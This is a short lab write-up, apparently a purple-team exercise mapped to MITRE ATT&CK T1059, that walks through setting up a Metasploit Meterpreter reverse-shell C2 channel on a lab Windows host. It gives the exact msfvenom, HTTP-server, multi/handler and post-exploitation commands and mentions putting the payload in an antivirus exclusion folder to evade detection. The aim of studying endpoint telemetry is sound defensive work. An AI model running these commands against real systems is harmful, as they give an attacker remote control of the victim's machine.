### MITRE ATT&CK T1059 - Command and Scripting Interpreter (C2 & Post-Exploitation)

This lab segment simulates the establishment of an interactive Command and Control (C2) channel using the Metasploit Framework and a memory-resident Meterpreter payload. 
The objective is to validate environmental execution controls and analyze endpoint telemetry generated by anomalous process relationships.

### Simulation Parameters
* **Attacker Host:** Kali Linux (`192.168.10.250`)
* **Target Host:** Windows 10 Workstation (`192.168.10.9`)
* **Domain Context:** `ADPRO`
* **Defensive Monitoring:** Sysmon + Splunk Enterprise Forwarder

---

## Execution Walkthrough

### 1. Payload Generation (Architecture Alignment)
To avoid architectural or protocol negotiation mismatches, a fresh 64-bit staged executable payload was generated on the attack platform:

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.10.250 LPORT=4444 -f exe -o /home/kali/Downloads/meterpreter.exe

### 2. Payload Delivery (Ingress)
cd /home/kali/Downloads
sudo python3 -m http.server 80

The payload was transferred to the target using a native PowerShell web request directly into a designated host folder exclusion zone to avoid static signature detection mid-stream:

### 3. 3. Catching the Session
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 192.168.10.250
set LPORT 4444
exploit

### 4. Post-Exploitation Activity

# Enumerate host identity details
meterpreter > sysinfo

# Spawn a child application process via the C2 channel
meterpreter > execute -f "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
Process 5300 created.
